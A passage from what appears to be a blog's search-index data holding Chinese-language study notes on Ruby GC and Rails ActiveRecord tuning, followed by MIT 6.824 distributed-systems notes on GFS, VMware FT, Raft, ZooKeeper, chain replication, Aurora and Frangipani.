}endend\nruby的ObjectSpace(heap)就是記憶體，一個ptr(RVALUE)對到一個slot，好多個slot變成一個page\nheap_sorted_length是目前alloc的連續長度(想像怎麼實作vma的)\nheap_allocated_pages是只有多少page(已經變成page的mem)\nheap_allocatable_pages是指可以再有多少page(已經malloc了的mem)\nheap_live_slots是指現在有多少object\nheap_free_slots是指有多少空的slot\nheap_final_slots是指多少slot被finalize\nheap_marked_slots是指old的object與沒有write barrier的物件(c-extendsion的mem)\ntomb_pages就是slot都是free (可以還給OS)\neden_pages就是至少有一個live slot\ntune gc的目的\n\n減少memory bloat\n減少跑gc的時間\n\n核心想法: 讓free slot不要太多\n調\n\nRUBY_GC_HEAP_FREE_SLOTS_GOAL_RATIO\nRUBY_GC_HEAP_INIT_SLOTS\nRUBY_GC_HEAP_FREE_SLOTS_MAX_RATIO\nRUBY_GC_HEAP_FREE_SLOTS_MIN_RATIO\n\nRUBY_GC_HEAP_FREE_SLOTS_GOAL_RATIO=0.1RUBY_GC_HEAP_FREE_SLOTS_MAX_RATIO=0.2RUBY_GC_HEAP_FREE_SLOTS_MIN_RATIO=0.05RUBY_GC_HEAP_INIT_SLOTS=1000000\norm\n核心概念: avoiding instantiating ActiveRecord objects\n\n如果很多records，不要用each一筆一筆讀，mem會起飛\n\nfind_each and in_batches loads them in batches\n\n\nSelect Only What You Need\nPreloads somehow\n\neager_load use LEFT OUTER JOIN when eager loading the model associations.\nincludes 最先考慮他\npreload 會產生qeury把指定的model載入，之後透過ruby把剩下的接起來\nEach eager load increases the number of instantiated objects, and in turn slows down the query\n\nEach eager load increases the number of instantiated objects, and in production-like data turn slows down the query\n\n\n\n\nDon’t Use Many Queries When One Will Do\n\ncreate too many ActiveRecord objects is when doing mass updates\n如果可以一行sql處理掉，就讓sql處理\n\nupdate_all, destroy_all\n\n\n\n\nDo Math In The Database\n\n如果需要統計可以留給db\n\n\nN+1\n\n用production的資料，跑看sql的log\n找SQL哪裡生出來的(看下面的code)\n跑rack-mini-profiler\n\n\n\nmodule LogQuerySource    def debug(*args, &amp;block)        return unless super                backtrace = Rails.backtrace_cleaner.clean caller        relevant_caller_line = backtrace.detect do |caller_line|        !caller_line.include?('/initializers/')        end        if relevant_caller_line            logger.debug(\" -&gt; #{ relevant_caller_line.sub(\"#{        end    endendActiveRecord::LogSubscriber.send :prepend, LogQuerySource\n書上的例子是這個\npartial會對每個collections的東西call find_by!!\nusing an ActiveRecord query method like find_by which is called on every element in a collection - is extremely common\n只要用在OOOs中的其中一個就有N+1的風險\n流程是\n\nMethods on a model trigger SQL queries (by using the ActiveRecord API)\nthose methods get called in the view\nthey end up being used in a partial or something that gets iterated for every element in a collection,\nN+1\n\n解法\n\nInstead of doing using ActiveRecord methods that trigger SQL queries, we’re going to rewrite this method to use regular Arrays and Enumerable methods.\nDo not use ActiveRecord query methods inside models, especially not on a model’s instance methods.\n\nUse them only in controllers and helpers.\n\n\n\n","categories":["System","Rails","Reading","Reading"]},{"title":"mit 6.824筆記","url":"/2022/03/6-824-notes/","content":"動機\n筆記\n\nintro\n提醒大家，在你設計一個系統時或者面對一個你需要解決的問題時，如果你可以在一台計算機上解決，而不需要分佈式系統，那你就應該用一台計算機解決問題\n有很多的工作都可以在一台計算機上完成，並且通常比分佈式系統簡單很多。所以，在選擇使用分佈式系統解決問題前，你應該要充分嘗試別的思路，因為分佈式系統會讓問題解決變得複雜\n分佈式系統的問題（挑戰）在於\n\n並發\n局部錯誤\n\n一部分組件在工作、另一部分組件停止運行\n這些計算機都在正常運行，但是網絡中斷了或者不穩定\n\n\n實際上一千台機器到底有多少性能是一個棘手的問題\n\n基礎架構\n\n存儲\n通信（網絡）\n計算\n\n我們希望通過這種抽象的接口，將分佈式特性隱藏在整個系統內\n我們的確也需要構建這樣一種基礎架構，它能夠盡可能多的對應用開發人員屏蔽和掩蓋錯誤\n\n性能 =&gt; 可擴展性(Scalability)\n容錯 =&gt; 可用性(Availability)\n\n大型分佈式系統中有一個大問題，那就是一些很罕見的問題會被放大\n\n1000台計算機的集群中，總是有故障\n\n主機\n網路\n\n\n\n\nrecoverability\n\n如果出現了問題，服務會停止工作，不再響應請求，之後有人來修復，並且在修復之後系統仍然可以正常運行，就像沒有出現過問題一樣\n為了實現這些特性，有很多工具\n\n非易失存儲（non-volatile storage，類似於硬盤）\n\ncheckpoint, log\n\n\n複製（replication）\n\n關鍵問題在於，這兩個副本總是會意外的偏離同步的狀態，而不再互為副本\n\n\n\n\n\n\n\n\n一致性（Consistency）\n\n一致性就是用來定義操作行為的概念 (多個副本)\n\n強一致（Strong Consistency）\n\n強一致可以確保get獲取的是最新的數據，但是實現這一點的代價非常高\n分佈式系統的各個組件需要做大量的通信，才能實現強一致性\n\n\n弱一致\n\n\n\n\n\n分佈式存儲系統的難點 (loop)\n\n巨大的性能加成 &gt; 分片\n分片（Sharding），但你將會看見常態的故障 &gt; 容錯（fault tolerance）\n複製（replication） &gt; 不一致（inconsistency）\n強一致 &gt; 低性能\n\nmapreduce\n\n這裡確實需要將每一份數據都通過網絡從創建它的Map節點傳輸到需要它的Reduce節點\n這裡實際上可能會有大量的網絡通信\ngfs\n設計與目標\n\nbig,fast\nglobal\nsharding\nautomatic recovering\n\n前提\n\nsingle data centor\ninternal use\nbig sequential access\n\n沒有random access\n\n\n\n\nMaster節點用來管理文件和Chunk的信息\nChunk服務器用來存儲實際的數據\nMaster節點知道每一個文件對應的所有的Chunk的ID，這些Chunk每個是64MB大小，它們共同構成了一個文件\nmaster node\n\nfilename\n\n很多chunk id\n\n\nchunk id\n\nchunk server的列表\nversion\n是不是primary chunk\n\nwrite只能在primary上跑\n\n\n租約時間\n\n\n\nMaster會在磁盤上存儲log，每次有數據變更時，Master會在磁盤的log中追加一條記錄，並生成CheckPoint（類似於備份點）\nread\n\nfilename + offset -&gt; chunk id + chunk server list\n選一個chunk server -&gt; chunk id + offset\n從一般的fs拿檔案\n\nwrite(只有append)\n當有多個客戶端同時寫同一個文件時，一個客戶端並不能知道文件究竟有多長\n沒有一個客戶端會知道文件究竟有多長，因此也就不知道該往什麼樣的偏移量，或者說向哪個Chunk去追加數據。\n客戶端可以向Master節點查詢哪個Chunk服務器保存了文件的最後一個Chunk。\n對於某個特定的Chunk來說，在某一個時間點，Master不一定指定了Chunk的主副本。所以，寫文件的時候，需要考慮Chunk的主副本不存在的情況\n如果發現Chunk的主副本不存在，Master會找出所有存有Chunk最新副本的Chunk服務器\n當客戶端想要對文件進行追加，但是又不知道文件尾的Chunk對應的Primary在哪時，Master會等所有存儲了最新Chunk版本的服務器集合完成，然後挑選一個作為Primary，其他的作為Secondary\nMaster會增加版本號，並將版本號寫入磁盤，這樣就算故障了也不會丟失這個數據\nMaster節點會向Primary和Secondary副本對應的服務器發送消息並告訴它們，誰是Primary，誰是Secondary，Chunk的新版本是什麼\n\n\nclient寫資料到各個chunk\n\n客戶端會將要追加的數據發送給Primary和Secondary服務器，這些服務器會將數據寫入到一個臨時位置。\n最開始，這些數據不會追加到文件中\n\n\n當所有的服務器都返回確認消息說，已經有了要追加的數據，客戶端會向Primary服務器發送一條消息，將這個數據追加到這個文件中\nPrimary服務器或許會從大量客戶端收到大量的並發請求，Primary服務器會以某種順序，一次只執行一個請求\nPrimary會通知所有的Secondary服務器也將客戶端要追加的數據寫入在它們自己存儲的Chunk末尾\n\n如果客戶端從Primary得到寫入失敗，那麼客戶端應該重新發起整個追加過程\n\nGFS這樣設計的理由是足夠的簡單，但是同時也給應用程序暴露了一些奇怪的數據\n這里希望為應用程序提供一個相對簡單的寫入接口，但應用程序需要容忍讀取數據的亂序\n將GFS升級成強一致系統，我可以為你列舉一些你需要考慮的事情\n\n讓Primary來探測重複的請求\n對於Secondary來說，如果Primay要求Secondary執行一個操作，Secondary必須要執行而不是只返回一個錯誤給Primary\n\n於一個嚴格一致的系統來說，是不允許Secondary忽略Primary的請求而沒有任何補償措施的\n\n\n當Primary要求Secondary追加數據時，直到Primary確信所有的Secondary都能執行數據追加之前，Secondary必須小心不要將數據暴露給讀請求\n\n第一個階段，Primary向Secondary發請求，要求其執行某個操作，並等待Secondary回复說能否完成該操作，這時Secondary並不實際執行操作。\n在第二個階段，如果所有Secondary都回复說可以執行該操作，這時Primary才會說，好的，所有Secondary執行剛剛你們回复可以執行的那個操作\n兩階段提交（Two-phase commit）\n\n\n新的Primary上任時，需要顯式的與Secondary進行同步\n\n當Primary崩潰時，可能有一組操作由Primary發送給Secondary\n\n\n要么對於Secondary需要一個租約系統，就像Primary一樣，這樣就知道Secondary在哪些時間可以合法的響應客戶端\n\n就是raft!!\nvmware ft\n複製不能處理軟件中的bug和硬件設計中的缺陷\n如果我們有兩個副本，一個Primay和一個Backup節點，我們總是假設兩個副本中的錯誤是相互獨立的。但是如果它們之間的錯誤是有關聯的，那麼複製對我們就沒有幫助\n這種複制的方案是否值得？因為它使用了我們實際需要的2-3倍的計算機資源\nState Transfer\nPrimary將自己完整狀態，比如說內存中的內容，拷貝並發送給Backup\nReplicated State Machine\n它只會從Primary將這些外部事件，例如外部的輸入，發送給Backup。\n通常來說，如果有兩台計算機，如果它們從相同的狀態開始，並且它們以相同的順序，在相同的時間，看到了相同的輸入，那麼它們會一直互為副本，並且一直保持一致。\n狀態轉移傳輸的是可能是內存，而復制狀態機會將來自客戶端的操作或者其他外部事件，從Primary傳輸到Backup。\n在多核上工作。這個新系統從我看來使用了狀態轉移，而不是複制狀態機。因為面對多核和並行計算，狀態轉移更加健壯。如果你使用了一台機器，並且將其內存發送過來了，那麼那個內存鏡像就是機器的狀態，並且不受並行計算的影響，但是複制狀態機確實會受並行計算的影響。但是另一方面，我認為這種新的多核方案代價會更高一些。\n會復制機器的完整狀態，這包括了所有的內存，所有的寄存器\n應用程序級別的複制系統。這樣做的後果是，複製這個行為，必須構建在應用程序內部。如果你收到了一系列應用程序級別的操作，你確實需要應用程序參與到復制中來\nVMware FT的獨特之處在於，它從機器級別實現複製，因此它不關心你在機器上運行什麼樣的軟件，它就是複制底層的寄存器和內存\n它的缺點是，它沒有那麼的高效，優點是，你可以將任何現有的軟件，甚至你不需要有這些軟件的源代碼，你也不需要理解這些軟件是如何運行的\n\n\nprimary負責收client的request\nVMM(hyperviser)遇到request會copy一份到secondary(log channel)\n\n不確定性\n\n中斷發生的時間有一樣嗎?\n有狀態的指令 (random, timeoftoday)\n多核\n\n\n對此需要特別的request格式\n\n日誌條目的類型\n數據: 一般資料或是已經跑完不確定性指令的資料\n事件發生時的指令序號\n\n\n\n\n在primary跑request之前會確認backup有收到log!! (ack)\n\n沒收到就不會把response丟回去\n\n就算primary已經做好了\n幾乎每一個複制系統都有這個問題，在某個時間點，Primary必須要停下來等待Backup，這對於性能是實打實的限制\n\n所以如果條件允許，人們會更喜歡使用在更高層級做複製的系統（詳見4.2 最後兩段）\n也就是應用程式層級的複製\n\n\n\n\n\n\nVMM會讓來自primary的response通過，backup的會drop\n\n重複output\n\n如果\n\nprimary在傳完response掛掉\nbackup還沒處理新的log\n\n\n這樣backup會消耗log來成為primary，之後丟response\n但因為現在backup是primary，所以response會被丟回去!!\n\n不過因為都是用TCP連線，所以TCP會drop重複的packet\n\ntcp的狀態與原本的primary一樣\n\n\n\n\n\n\n對於任何有主從切換的複制系統，基本上不可能將系統設計成不產生重複輸出\n\n為了避免重複輸出，有一個選項是在兩邊都不生成輸出，但這是一個非常糟糕的做法（因為對於客戶端來說就是一次失敗的請求）\n當出現主從切換時，切換的兩邊都有可能生成重複的輸出，這意味著，某種程度上來說，所有復制系統的客戶端需要一種重複檢測機制\n\n\n\n\nprimary與backup之間有heart beat確認health\n\n還有Test-and-Set確認對方真的掛了 (想像雙方剛好log channel的連線被block)\n\nTest-and-Set服務不運行在Primary和Backup的物理服務器上，VMware FT需要通過網絡支持Test-and-Set服務\n\n這有點像一個鎖。為了能夠上線，它們或許會同時發送一個Test-and-Set請求，給Test-and-Set服務。\n\n當第一個請求送達時，Test-and-Set服務會說，這個標誌位之前是0，現在是1\n\n\n\n\n在6.824這門課程中，有個核心的規則就是，你無法判斷另一個計算機是否真的掛了，你所知道的就是，你無法從那台計算機收到網絡報文，你無法判斷是因為那台計算機掛了，還是因為網絡出問題了導致的\n\n\n\n\n\n\nraft\n整個系統有兩個時間\n\nserver自己\n\n也就是做了什麼\n\n\n動作的source\n\n現在該聽誰的\n\n單一source可以處理brain-split\n\n\n\n\n\nraft是共識algorithm，所以要處理consistency\n\n單一source =&gt; brain-split\n\n也有可能沒有leader，但這個時候system也不能做什麼事\n\n\nmajarity votes =&gt; fault-toroelent\ncommit, and then apply\n\n\n重要的state (時間)\n\n所有server的現在時間\n\ncurrentTerm\n\n\nserver自身的時間\n\nvotedFor\nlog[]\n\n後面處理log compaction會看到，log還要多一個狀態snapshot\n\n\n\n\n\n執行期狀態 (做到哪)\n\nserver自己\n\ncommitIndex: log收到哪\nlastApplied: log做到哪\n\n\nleader狀態\n\nnextIndex[]: 要從哪個log開始塞給ith follower\nmatchIndex[]: ith follower做到哪了\n\n\n\n\n接下去就是下面其中一個事件發生\n\n選leader\n\nRequestVote RPC\n\n前提\n\n收到的term要大於等於自己 (所有server的現在時間夠新)\n\n\n之後就\n\n改votedFor\n\n\n\n\n\n\n\n\n\n處理client request\n\nAppendEntries RPC\n\n前提\n\n收到的term要大於等於自己 (所有server的現在時間夠新)\nprevLogIndex 有東西 &amp; prevLogTerm 對得起來 (server自身的時間是對得起來的)\n\n對不起來?\n\nprevLogIndex沒東西\n\nreturn false (leader與自己的狀態對不起來)\n\n\nprevLogTerm不對\n\n把prevLogIndex後面的東西刪掉\n\n\n\n\n\n\n\n\n之後就\n\n把entries接上去\n更新commitIndex\n\n\n\n\n\n\n\n\n接著就是看state怎麼改變的\n\n\n什麼時候apply log\n\ncommitIndex &gt; lastApplied\n\n同時跟新lastApplied\n\n\n\n\n\n什麼時候換currentTerm\n\n收到大於自己term的rpc時\n\n同時換votedFor\n\n\n成為candidate (來自timeout)\n\n\n\n\nleader怎麼知道\n\n大家commit到哪 (leader怎麼跟新commitIndex)\n\nN &gt; commitIndex, a majority of matchIndex[i] ≥ N, and log[N].term == currentTerm\n\n\n我的prevLogIndex是錯的\n\nAppendEntries回傳false, 之後leader的prevLogIndex自己退一格，retry AppendEntries\n\nleader退無可退怎麼辦?\n\n這個時候就是snapshot了\n\n\n\n退一格不會太慢 (7.3 快速恢复（Fast Backup）)\n\nfollower的reply加上，衝突位置(prevLogIndex)的\n\nXTerm: prevLogIndex的位置的term\nXIndex: XTerm的第一個event的log 位置\nXLen: 有多少空白的log\n\n\n之後有3個case\n\nXTerm是空的\n\n從XLen開始蓋\n\n\n沒看過XTerm的term\n\n從XIndex開始蓋\n\n\n看過XTerm的term，所以是index對不上\n\n從XIndex-1開始蓋\n\n\n\n\n\n\n\n\n\n\n什麼時候要response給client\n\n收到AppendEntries的過半reply\n\n\n\n\n\n\n有一個細節在 6.8 选举定时器（Election Timer） 提到\n就是timeout可能有livelock，所以可以像ethernet的CSMA/CD，但是retry的間隔至少要大於heartbeat的間隔\nLinearizability\n一個系統的執行歷史是一系列的客戶端請求，或許這是來自多個客戶端的多個請求。如果執行歷史整體可以按照一個順序排列，且排列順序與客戶端請求的實際時間相符合，那麼它是線性一致的\n對於線性一致的順序順序，有兩個限制條件：\n\n如果一個操作在另一個操作開始前就結束了，那麼這個操作必須在執行歷史中出現在另一個操作前面。\n\n時間序 (可能會出現concurrent)\n可以當成從第一個write response最後開始跑的bfs tree\n\n\n執行歷史中，讀操作，必須在相應的key的寫操作之後。\n\n把tree壓成line\n\n\n\n這裡要看一個例子\n\n這個read是3符合Linearizability?\n在第一個write後發read，但是中間經歷重傳，也許read是在write 4之後完成的\n但是這裡的第一個read是在第一個write之後，所以就算丟3也ok\n客戶端永遠也不能在一個線性一致的系統中看到舊的數據（也就是X=1），因為一個線性一致的系統不允許讀出舊的數據\n對於讀請求不允許返回舊的數據，只能返回最新的數據。或者說，對於讀請求，線性一致系統只能返回最近一次完成的寫請求寫入的值。\nzookeeper\nfirst-in-first-out order\n如果系統不提供線性一致性，那麼系統是否還可用？客戶端發送了一個讀請求，但是並沒有得到當前的正確數據，也就是最新的數據，那我們為什麼要相信這個系統是可用的？\n如果read/write都是透過leader做，這樣沒有scalbility\n\nZookeeper並不要求返回最新的寫入數據。 Zookeeper的方式是，放棄線性一致性，提升read的效率\n直接讓follower處理read\n\n但是zookeeper保證會照client的指令order(first-in-first-out)去跑\n\nhow?\n\n在指令上打index，讓index對到log的index(response中附上log index(zxid))，之後就是確保在log的index大於等於前面坐指令時的log index大的狀態下跑指令\n\n\n\n讀寫請求是線性一致的，這讓前面的第一個問題有了解法，同步操作（sync）\n同步操作（sync）就是\n\n先發一個write (透過raft完成)\n之後read要求一定要在前面的write發生之後 (透過first-in-first-out完成)\n\nready file(transcation, seqlock)\n\n先刪raedy file\n做write\n創ready file\n\n之後client就能認ready file去讀，但這樣有問題有可能在刪之前ready還在，但中間其他的write啟動了\n\n所以會多一個watch確認ready file有沒有被動，有被通知就要retry\nZookeeper可以保證如果某個人刪除了Ready file，相應的通知，會在任何後續的讀請求之前，發送到客戶端。\n客戶端會先收到有關Ready file刪除的通知，之後才收到其他在Log中位於刪除Ready file之後的讀請求的響應\nAPI\nZookeeper的API某種程度上來說像是一個文件系統\nZookeeper被設計成要被許多可能完全不相關的服務共享使用。所以我們需要一個命名系統來區分不同服務的信息\nZookeeper中包含了3種類型的znode\n\nRegular znodes\n\n這種znode一旦創建，就永久存在，除非你刪除了它。\n\n\nEphemeral znodes\n\n如果Zookeeper認為創建它的客戶端掛了，它會刪除這種類型的znodes\n\n客戶端需要時不時的發送心跳給Zookeeper，這樣Zookeeper才不會刪除客戶端對應的ephemeral znodes。\n\n\n\n\nSequential znodes\n\nZookeeper實際上創建的文件名是你指定的文件名再加上一個數字。\n當有多個客戶端同時創建Sequential文件時，Zookeeper會確保這裡的數字不重合，同時也會確保這裡的數字總是遞增的。\n\n\n\n每一個znode都有一個表示當前版本號的version，當znode有更新時，version也會隨之增加\n\nCREATE(PATH，DATA，FLAG)\nDELETE(PATH，VERSION)\nEXIST(PATH，WATCH)\nGETDATA(PATH，WATCH)\nSETDATA(PATH，DATA，VERSION)\nLIST(PATH)\n\nacc\nV是版本號\nWHILE TRUE:    X, V = GETDATA(&quot;F&quot;)    IF SETDATA(&quot;f&quot;, X + 1, V):        BREAK\nNon-Scalable Lock\nWHILE TRUE:    IF CREATE(&quot;f&quot;, data, ephemeral=TRUE): RETURN    IF EXIST(&quot;f&quot;, watch=TRUE):        WAIT\n最終鎖會以刪除文件的形式釋放，所以我們這里通過EXIST函數加上watch=TRUE，來監測文件的刪除\n羊群效應（Herd Effect）\n對於計數器的例子來說，就是當有1000個客戶端同時需要增加計數器時，我們的複雜度是$O(n^2)$，這是處理完1000個客戶端的請求所需要的總時間。\n$loop * watch通知 = O(n^2)$\nScalable Lock\nCREATE(&quot;f&quot;, data, sequential=TRUE, ephemeral=TRUE)WHILE TRUE:    LIST(&quot;f*&quot;)    IF NO LOWER #FILE: RETURN    IF EXIST(NEXT LOWER #FILE, watch=TRUE):        WAIT\nChain Replication with Apportioned Queries\nChain Replication\n所有機器串成linked list，從頭開始處理write，直到碰到最後一個機器才response\nread就是從tail的狀態直接拉\n\n可以注意到這個系統是線性一致的!!\n同時可以讓read的性能可以scale!!\nFail Recover\n\nhead, tail fail?\n\n找前一個或是後一個替代\n\n\nmid fail?\n\n把mid移除，把前一個的write轉給下一個\n\n\n\nChain Replication 與 Raft\n\n從性能上看，對於Raft，如果我們有一個Leader和一些Follower。\n\nLeader需要直接將數據發送給所有的Follower。\n\n所以，當客戶端發送了一個寫請求給Leader，Leader需要自己將這個請求發送給所有的Follower。\n\n\n然而在Chain Replication中，HEAD只需要將寫請求發送到一個其他節點。\n\n\n數據在網絡中發送的代價較高，所以Raft Leader的負擔會比Chain Replication中HEAD的負擔更高。\n當客戶端請求變多時，Raft Leader會到達一個瓶頸，而不能在單位時間內處理更多的請求。\n\n而同等條件以下，Chain Replication的HEAD可以在單位時間處理更多的請求，瓶頸會來的更晚一些。\n\n\n另一個與Raft相比的有趣的差別是，Raft中讀請求同樣也需要在Raft Leader中處理，所以Raft Leader可以看到所有的請求。\n\n而在Chain Replication中，每一個節點都可以看到寫請求，但是只有TAIL可以看到讀請求。\n所以負載在一定程度上，在HEAD和TAIL之間分擔了，而不是集中在單個Leader節點。\n\n\n前面分析的故障恢復，Chain Replication也比Raft更加簡單。這也是使用Chain Replication的一個主要動力。\n\nChain Replication並不能抵禦網絡分區，也不能抵禦腦裂。\n總是會有一個外部的權威（External Authority）來決定誰是活的，誰掛了，並確保所有參與者都認可由哪些節點組成一條鏈\nConfiguration Manager的工作就是監測節點存活性，一旦Configuration Manager認為一個節點掛了，它會生成並送出一個新的配置，在這個新的配置中，描述了鏈的新的定義，包含了鏈中所有的節點，HEAD和TAIL\n你是如何使得一個服務是容錯的，不否認自己，同時當有網絡分區時不會出現腦裂呢？\nConfiguration Manager通常會基於Raft或者Paxos\nAurora\nRDS的歷史\nEC2對於無狀態的Web服務器來說是完美的\n如果突然新增了大量客戶，你可以立刻向Amazon租用更多的EC2實例，並在上面啟動Web服務。這樣你就可以很簡單的對你的Web服務進行擴容\n當Web服務所在的服務器宕機了，是完全沒有問題的，因為Web服務本身沒有狀態，你只需要在一個新的EC2實例上啟動一個新的Web服務就行\n對於數據庫來說，EC2就不像對於Web服務那樣完美了\n如果服務器宕機了，那麼它本地硬盤也會無法訪問\n從EC2實例來看，EBS就是一個硬盤，你可以像一個普通的硬盤一樣去格式化它，就像一個類似於ext3格式的文件系統或者任何其他你喜歡的Linux文件系統\n在實現上，EBS底層是一對互為副本的存儲服務器\n兩個EBS服務器會使用Chain Replication（9.5）進行複制\n現在你運行了一個數據庫，相應的EC2實例將一個EBS volume掛載成自己的硬盤。當數據庫執行寫磁盤操作時，數據會通過網絡送到EBS服務器。\nEBS的缺點\n\n如果你在EBS上運行一個數據庫，那麼最終會有大量的數據通過網絡來傳遞\n\n網絡負載更加重要\n不太關心CPU和存儲空間的消耗\n\n\nEBS的容錯性不是很好\n\n出於性能的考慮，Amazon總是將EBS volume的兩個副本存放在同一個數據中心\n\n\n\nRDS\n\n將數據庫在多個AZ之間做複製\n\n這樣就算整個數據中心掛了，你還是可以從另一個AZ重新獲得數據而不丟失任何寫操作\n\n\n對於RDS來說，有且僅有一個EC2實例作為數據庫\n\n這個數據庫將它的data page和WAL Log存儲在EBS，而不是對應服務器的本地硬盤\n\n\n當數據庫執行了寫Log或者寫page操作時，這些寫請求實際上通過網絡發送到了EBS服務器\n每一次數據庫軟件執行一個寫操作，Amazon會自動的，將寫操作拷貝發送到另一個數據中心的AZ中\n每一次寫操作，數據除了發送給AZ1的兩個EBS副本之外，還需要通過網絡發送到位於AZ2的副數據庫\n\n副數據庫接下來會將數據再發送給AZ2的兩個獨立的EBS副本\n\n\n\n這種Mirrored MySQL比Aurora慢得多的原因是，它通過網絡傳輸了大量的數據\nAurora\n\n在替代EBS的位置，有6個數據的副本，位於3個AZ，每個AZ有2個副本\n\n這里通過網絡傳遞的數據只有Log條目\n\n存儲系統不再是通用（General-Purpose）存儲，這是一個可以理解MySQL Log條目的存儲系統\n\n\n\n\n\nAurora並不需要6個副本都確認了寫入才能繼續執行操作 (Quorum)\n\n只要Quorum形成了，也就是任意4個副本確認寫入了，數據庫就可以繼續執行操作\n\n可以處理斷線、太慢的node\n\n\nQuorum\n\n假設有N個副本。為了能夠執行寫請求，必須要確保寫操作被W個副本確認，W小於N\nQuorum系統要求，任意你要發送寫請求的W個服務器，必須與任意接收讀請求的R個服務器有重疊\n\n這樣任意W個服務器至少與任意R個服務器有一個重合 ($W+R&gt;=N$)\n\n\n客戶端讀請求可能會得到R個不同的結果，哪一個是正確的呢？\n\n投票?\n\n可能只有一個是對的\n\n只能確保Read Quorum必須至少與Write Quorum有一個服務器是重合的\n\n\n\n\n版本號（Version）\n\n每一次執行寫請求，你需要將新的數值與一個增加的版本號綁定\n從Read Quorum得到了一些回复，客戶端可以直接使用其中的最高版本號的數值\n\n\n\n\nQuorum系統可以調整讀寫的性能。通過調整Read Quorum和Write Quorum，可以使得系統更好的支持讀請求或者寫請求\n\n\nAurora’s Quorum\n\n不會直接覆蓋資料，append log\n\nQuorum系統通常讀寫的數據都是相同的\n\n\n數據庫服務器寫入的是Log條目，但是讀取的是page\n\n數據庫服務器會記錄每一個存儲服務器\n\n接收了多少Log\n收到的最高連續的Log條目號\n\n\n當一個數據庫服務器需要執行讀操作，它只會挑選擁有最新Log的存儲服務器，然後只向那個服務器發送讀取page的請求\n\n\n請求發送到存儲服務器，會要求存儲服務器返回當前最新的page數據。在這個時候，存儲服務器才會將Log條目中的新數據更新到page，並將page寫入到自己的磁盤中，之後再將更新了的page返回給數據庫服務器\n數據庫服務器有時也會使用Quorum Read!!\n\n如果DB壞了，監控系統可以檢測到Aurora數據庫服務器崩潰\n之後就會要求store server把還沒完成的transation丟了\n去找遺失的transaction id，對此跑Quorum Read\n讓連到的store server保留遺失的transaction id之前的log\n\n\n\n\n\n\n\nsharding\n目前為止，我們已經知道Aurora將自己的數據分佈在6個副本上，每一個副本都是一個計算機，上面掛了1-2塊磁盤。\n但是如果只是這樣的話，我們不能擁有一個數據大小大於單個機器磁盤空間的數據庫\n因為雖然我們有6台機器，但是並沒有為我們提供6倍的存儲空間\nAmazon的做法是將數據庫的數據，分割存儲到多組存儲服務器上，每一組都是6個副本，分割出來的每一份數據是10GB\n如果一個數據庫需要20GB的數據，那麼這個數據庫會使用2個PG（Protection Group），其中一半的10GB數據在一個PG中，另一半的10GB數據存儲在另一個PG中\n\nrecover\n一個store server會有其他PG的其中一塊，如果store server掛了，怎麼復原?\n對於每一個數據塊，我們會從Protection Group中挑選一個副本，作為數據拷貝的源。\n之後，就可以並行的通過網絡將100個數據塊從100個源拷貝到100個目的\nsingle write\n對於Aurora來說，通常會有非常大量的只讀數據庫查詢\n對於寫請求，可以只發送給一個數據庫，因為對於後端的存儲服務器來說，只能支持一個寫入者\nLog需要按照數字編號，如果只在一個數據庫處理寫請求，非常容易對Log進行編號\n當客戶端向只讀數據庫發送讀請求，只讀數據庫需要弄清楚它需要哪些data page來處理這個讀請求，之後直接從存儲服務器讀取這些data page，並不需要主數據庫的介入\n只讀數據庫也需要更新自身的緩存，所以，Aurora的主數據庫也會將它的Log的拷貝發送給每一個只讀數據庫\ncache &amp; Transaction\n我們不想要這個只讀數據庫看到未commit的事務。所以，在主數據庫發給只讀數據庫的Log流中，主數據庫需要指出，哪些事務commit了\n數據庫背後的B-Tree結構非常複雜，可能會定期觸發rebalance(需要有原子性)\n數據庫服務器可以通知存儲服務器說，這部分複雜的Log序列只能以原子性向只讀數據庫展示，也就是要就全展示，不然就不展示 (微事務（Mini-Transaction）)\n教訓\n數據庫和存儲系統基本是一起開發出來的，數據庫和存儲系統以一種有趣的方式集成在了一起\n通常我們設計系統時，需要有好的隔離解耦來區分上層服務和底層的基礎架構\n但是在Aurora面臨的問題中，性能問題是非常嚴重的，它不得不通過模糊服務和底層基礎架構的邊界來獲得35倍的性能提升\n雲基礎架構中什麼更重要的隱含信息\n\n需要擔心整個AZ會出現故障\n需要擔心短暫的慢副本，這是經常會出現的問題\n網絡是主要的瓶頸，畢竟Aurora通過網絡發送的是極短的數據，但是相應的，存儲服務器需要做更多的工作\n\n明顯，從Amazon看來，網絡容量相比CPU要重要的多\n\n\n\nFrangipani\n緩存一致性是指，如果我緩存了一些數據，之後你修改了實際數據但是並沒有考慮我緩存中的數據，必須有一些額外的工作的存在，這樣我的緩存才能與實際數據保持一致\n大部分的討論都會假設Petal就是一個被所有Frangipani使用的，基於網絡的共享磁盤。你可以通過一個塊號或者磁盤上的一個地址來讀寫數據，就像一個普通的硬盤一樣\n在每個工作站或者說每個Frangipani服務器上要持有緩存之外，我們還需要支持Write-Back緩存。\n這意味著，如果我想要修改某個數據，比如說我修改了一個文件，只要沒有其他的工作站需要看到我的改動，Frangipani通過Write-Back緩存方式管理這些數據\n在這樣的架構下，一個非常重要的後果是，文件系統的邏輯需要存在於每個工作站上，所有的複雜的邏輯都在工作站中的Frangipani模塊中\n所有的這些修改最初只會在本地緩存中存在，因此類似於創建文件的操作可以非常快的完成，因為只需要修改本地的內存中對於磁盤的緩存。而這些修改要過一會才會寫回到Petal (複雜度的開始)\n\nFrangipani的挑戰（Challenges）\n\n緩存\n\n文件系統必須要做一些事情來確保客戶端可以讀到最新的寫入文件 (強一致或者線性一致)\n\n但是在一個緩存的環境中，現在說的一致性的問題不是指存儲服務器的一致性，而是\n\n指工作站上的一些修改需要被其他工作站看到 (Cache Coherence)\n\n\n\n\n由於Write-Back緩存，可能會在本地的緩存中堆積了大量的修改\n\n如果我的工作站崩潰了，但是這時這些修改只有部分同步到了Petal，還有部分仍然只存在於本地\n\n我的工作站在執行操作的過程中的崩潰，最好不要損壞其他人同樣會使用的文件系統 (crash recovery)\n\n\n\n\n\n\n去中心化的架構帶來的大量的邏輯存在於客戶端之中進而引起的問題\n\n因為所有的文件和目錄都是共享的，非常容易會有兩個工作站在同一個時間修改同一個目錄 (Atomicity)\n\n我們希望類似於創建文件，刪除文件這樣的操作表現的就像即時生效的一樣，同時不會與相同時間其他工作站的操作相互干擾\n\n\n\n\n\n緩存一致性\nFrangipani的緩存一致性核心是由鎖保證的，我們之後在原子性和故障恢復中將會再次看到鎖。\nLock server\n\nserver 本身\n\nfile到owner的map\n\n\n我們假設鎖是排他鎖（Exclusive 